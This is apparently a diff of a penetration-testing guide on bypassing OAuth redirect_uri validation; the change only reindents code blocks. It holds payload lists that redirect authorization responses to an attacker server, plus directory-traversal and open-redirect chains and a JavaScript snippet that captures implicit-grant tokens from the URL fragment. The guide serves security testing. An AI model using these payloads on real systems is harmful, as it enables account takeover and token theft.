@@ -31,34 +31,34 @@ In this example, we will use http://wearelucid.io as the exploit server.
 	- Try keeping the original redirect_uri, but appending a second one with your exploit server `redirect_uri=https://valid.server.com/oath-callback&redirect_uri=http://wearelucid.io/oauth-callback`
 	- Try appending values onto the end of the valid redirect uri parameter. Typical SSRF bypasses are good to try...
 
-	```
-	redirect_uri=https://valid.server.com/oauth-callback&http://wearelucid.io
-	redirect_uri=https://valid.server.com/oauth-callback#http://wearelucid.io
-	redirect_uri=https://valid.server.com/oauth-callback?http://wearelucid.io
-	redirect_uri=https://valid.server.com/oauth-callback;http://wearelucid.io
-	redirect_uri=https://valid.server.com/oauth-callback@http://wearelucid.io
-	redirect_uri=https://valid.server.com/oauth-callback.http://wearelucid.io
-	```
+		```
+		redirect_uri=https://valid.server.com/oauth-callback&http://wearelucid.io
+		redirect_uri=https://valid.server.com/oauth-callback#http://wearelucid.io
+		redirect_uri=https://valid.server.com/oauth-callback?http://wearelucid.io
+		redirect_uri=https://valid.server.com/oauth-callback;http://wearelucid.io
+		redirect_uri=https://valid.server.com/oauth-callback@http://wearelucid.io
+		redirect_uri=https://valid.server.com/oauth-callback.http://wearelucid.io
+		```
 
 or combinations of the above as well
 
     - Try reversing the above combinations e.g
 
-```
-redirect_uri=https://wearelucid.io/oauth-callback&@https://valid.server.com
-```
+	```
+	redirect_uri=https://wearelucid.io/oauth-callback&@https://valid.server.com
+	```
 
     - Attempt to configure a subdomain on your attack server with the name of the valid server e.g.
 
-```
-redirect_uri=http://valid.server.com.wearelucid.io/oauth-callback
-```
+	```
+	redirect_uri=http://valid.server.com.wearelucid.io/oauth-callback
+	```
 
     - On the off chance that any URI with localhost in it's name is allowed, try this as well
 
-```
-redirect_uri=http://localhost.wearelucid.io/oauth-callback
-```
+	```
+	redirect_uri=http://localhost.wearelucid.io/oauth-callback
+	```
 
 4) In addition to the above tests, try changing the response_mode= parameter from query to fragment, or vice versa. You may run into an entirely different validation schema in different modes. For example if you try the response_mode=web_message value, a wider range of subdomains may be allowed in the redirect_uri parameter. If you're feeling ambitious, go through the above bypasses again to see if there is any difference. 
 
@@ -72,20 +72,20 @@ redirect_uri=http://localhost.wearelucid.io/oauth-callback
 If none of those bypasses work then the URI validation seems to be solid. At this point you'll want to try directory traversal methods and open redirect chaining. 
 
 1) Try the proper redirect_uri= value, but with a directory traversal to another directory on the same server.
-```
-redirect_uri=https://valid.server.com/oauth-callback/../some/other/directory
-```
+	```
+	redirect_uri=https://valid.server.com/oauth-callback/../some/other/directory
+	```
 2) If that doesn't give you an error it's time to start looking for an open redirect vulnerability, or a URL with a GET parameter that has a reflected XSS on the same host. In the case of an open redirect...
 	-  If authorization code, you should be able to just redirect to your own server and in your logs you wll see the code=value
 	- If implicit grant you actually have a little more work to do. You will need to host code that extracts the URL fragment because it won't show up in logs. As an example...
 
-```javascript
-if(!window.location.hash) { 
-	document.location = 'https://oauth.server.com/auth?client_id=[id]&redirect_uri=https://valid.server.com/oauth-callback/../open/redirect?path=https://wearelucid.io/exploit.html&response_type=token&nonce=[nonce]&scope=openid%20profile%20email' 
-} else { 
-	window.location = '/?hash='+document.location.hash.substr(1) 
-}
-```
+	```javascript
+	if(!window.location.hash) { 
+		document.location = 'https://oauth.server.com/auth?client_id=[id]&redirect_uri=https://valid.server.com/oauth-callback/../open/redirect?path=https://wearelucid.io/exploit.html&response_type=token&nonce=[nonce]&scope=openid%20profile%20email' 
+	} else { 
+		window.location = '/?hash='+document.location.hash.substr(1) 
+	}
+	```
 
 **To prove exploitation** 
 
